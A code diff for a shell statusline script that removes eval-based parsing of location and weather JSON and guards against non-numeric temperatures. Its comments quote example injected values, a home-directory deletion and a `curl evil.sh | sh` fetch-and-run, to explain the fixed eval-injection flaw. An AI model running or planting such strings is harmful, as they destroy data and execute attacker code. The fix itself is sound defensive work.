@@ -579,14 +579,26 @@ if [ "$MODE" = "mini" ] || [ "$MODE" = "normal" ]; then
     if [ "$cache_age" -gt "$WEATHER_CACHE_TTL" ]; then
         lat="" lon=""
         if [ -f "$LOCATION_CACHE" ]; then
-            eval "$(jq -r '"lat=\(.lat // empty)\nlon=\(.lon // empty)"' "$LOCATION_CACHE" 2>/dev/null)"
+            # Parse fields with jq directly into shell vars. Never eval untrusted
+            # JSON: a "lat" value of `; rm -rf $HOME; #` would run as a shell
+            # command under the previous eval-of-jq-string-interpolation pattern.
+            lat=$(jq -r '.lat // empty' "$LOCATION_CACHE" 2>/dev/null)
+            lon=$(jq -r '.lon // empty' "$LOCATION_CACHE" 2>/dev/null)
         fi
         lat="${lat:-37.7749}"
         lon="${lon:-122.4194}"
 
         weather_json=$(curl -s --max-time 3 "https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,weather_code,is_day&temperature_unit=${TEMP_UNIT}" 2>/dev/null)
         if [ -n "$weather_json" ] && echo "$weather_json" | jq -e '.current' >/dev/null 2>&1; then
-            eval "$(echo "$weather_json" | jq -r '.current | "temp=\(.temperature_2m)\ncode=\(.weather_code)\nis_day=\(.is_day)"' 2>/dev/null)"
+            # Parse fields with jq directly into shell vars. Never eval HTTP
+            # response bodies — a compromised / MITM'd / DNS-rebound upstream
+            # could return a "temperature_2m" string like `; curl evil.sh | sh; #`
+            # which the previous eval-of-jq-string-interpolation pattern executed
+            # under the user's shell. (CWE-95 eval injection — semgrep
+            # bash.curl.security.curl-eval.curl-eval, OWASP A03.)
+            temp=$(printf '%s' "$weather_json" | jq -r '.current.temperature_2m // ""' 2>/dev/null)
+            code=$(printf '%s' "$weather_json" | jq -r '.current.weather_code // ""' 2>/dev/null)
+            is_day=$(printf '%s' "$weather_json" | jq -r '.current.is_day // ""' 2>/dev/null)
             # Map open-meteo weather_code → single emoji glyph (clear/cloudy/fog/rain/snow/storm)
             # Day vs. night uses the is_day flag to pick sun ☀ vs. moon 🌙 for clear conditions.
             case "$code" in
@@ -602,11 +614,19 @@ if [ "$MODE" = "mini" ] || [ "$MODE" = "normal" ]; then
                 95|96|99)       icon="⛈️" ;;
                 *)              icon="🌡️" ;;
             esac
-            temp_int=$(printf '%.0f' "$temp")
-            if [ "$TEMP_UNIT" = "celsius" ]; then
-                echo "${icon} ${temp_int}°C" > "$WEATHER_CACHE"
-            else
-                echo "${icon} ${temp_int}°F" > "$WEATHER_CACHE"
+            # Numeric guard: skip the cache write entirely if upstream sent
+            # a non-numeric temperature value rather than printing a stderr
+            # noise + an empty-temp line into the statusline cache.
+            case "$temp" in
+                ''|*[!0-9.+-]*) temp_int="" ;;
+                *) temp_int=$(printf '%.0f' "$temp" 2>/dev/null) ;;
+            esac
+            if [ -n "$temp_int" ]; then
+                if [ "$TEMP_UNIT" = "celsius" ]; then
+                    echo "${icon} ${temp_int}°C" > "$WEATHER_CACHE"
+                else
+                    echo "${icon} ${temp_int}°F" > "$WEATHER_CACHE"
+                fi
             fi
         fi
     fi
